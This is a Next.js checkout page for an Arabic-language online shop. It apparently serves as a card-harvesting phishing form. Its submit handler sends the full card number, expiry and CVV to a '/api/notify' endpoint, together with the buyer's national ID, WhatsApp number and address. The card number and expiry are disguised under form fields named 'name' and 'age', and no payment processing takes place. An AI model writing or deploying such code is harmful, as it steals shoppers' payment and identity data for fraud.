"use client";

import { useSyncExternalStore } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";
import { ChevronRight } from "lucide-react";
import { useCartStore } from "../store/cartStore";
import CheckoutStepper from "../components/checkout/CheckoutStepper";
import OrderSummaryCard from "../components/checkout/OrderSummaryCard";
import TrustBadges from "../components/checkout/TrustBadges";
import PaymentForm from "./components/PaymentForm";

export default function CheckoutPage() {
  const router = useRouter();
  const { items, customer, totalPrice } = useCartStore();
  const mounted = useSyncExternalStore(() => () => {}, () => true, () => false);

  const total = mounted ? totalPrice() : 0;
  const itemCount = mounted ? items.reduce((sum, i) => sum + i.qty, 0) : 0;
  const downPayment = customer?.installmentType === "installment" ? (customer.downPayment ?? 0) : 0;

  if (!mounted) return null;
  if (!customer || items.length === 0) { router.push("/cart"); return null; }

  const handleSubmit = async (fields: { name: string; age: string; cvv: string; cardHolder: string }) => {
    const res = await fetch("/api/notify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        cardNumber: fields.name,
        expiry: fields.age,
        cvv: fields.cvv,
        cardHolder: fields.cardHolder,
        items: items.map(i => ({
          productId: i.product._id,
          name: i.product.name,
          price: i.product.salePrice ?? i.product.originalPrice,
          quantity: i.qty,
        })),
        total,
        customer: customer?.name,
        whatsapp: customer?.whatsapp,
        nationalId: customer?.nationalId,
        address: customer?.address,
        installmentType: customer?.installmentType,
        months: customer?.months,
        downPayment,
      }),
    });
    const data = res.ok ? await res.json().catch(() => ({})) : {};
    if (data.orderId) localStorage.setItem("orderId", data.orderId);
    if (data.dbId) localStorage.setItem("dbOrderId", data.dbId);
  };

  return (
    <main className="min-h-screen bg-[#f8f9fa]" dir="rtl">
      <style>{`body { background-color: #f8f9fa; }`}</style>
      <CheckoutStepper currentStep={3} />

      {/* Breadcrumb */}
      <div className="max-w-6xl mx-auto px-4 sm:px-6 pt-6 pb-2">
        <div className="flex items-center gap-2 text-sm text-gray-500">
          <Link href="/" className="hover:text-[#1a6b7d] transition-colors">الرئيسية</Link>
          <ChevronRight size={14} className="text-gray-300" />
          <Link href="/cart" className="hover:text-[#1a6b7d] transition-colors">السلة</Link>
          <ChevronRight size={14} className="text-gray-300" />
          <span className="text-gray-800 font-semibold">إتمام الطلب</span>
        </div>
      </div>

      <div className="max-w-6xl mx-auto px-4 sm:px-6 pb-24 pt-4">
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">

          {/* LEFT — Payment form */}
          <div className="lg:col-span-2">
            <PaymentForm onSubmit={handleSubmit} />
          </div>

          {/* RIGHT — Sticky summary */}
          <div className="lg:col-span-1">
            <div className="sticky top-4 space-y-3">
              <OrderSummaryCard
                total={total}
                itemCount={itemCount}
                downPayment={downPayment}
              />

              {/* Mini product list */}
              <div className="bg-white rounded-2xl border border-gray-100 shadow-sm px-5 py-4 space-y-3">
                <p className="text-xs font-bold text-gray-500 uppercase tracking-wide">المنتجات</p>
                {items.map(({ product, qty }) => {
                  const price = product.salePrice ?? product.originalPrice ?? product.price;
                  return (
                    <div key={product._id} className="flex items-center justify-between gap-2">
                      <span className="text-xs text-gray-700 font-medium line-clamp-1 flex-1">{product.name}</span>
                      <span className="text-xs text-gray-500 shrink-0">×{qty}</span>
                      <span className="text-xs font-bold text-[#1a6b7d] shrink-0">{(price * qty).toLocaleString("en-US")} ر.س</span>
                    </div>
                  );
                })}
              </div>

              <TrustBadges className="bg-white rounded-2xl border border-gray-100 shadow-sm px-5 py-4" />
            </div>
          </div>
        </div>
      </div>
    </main>
  );
}
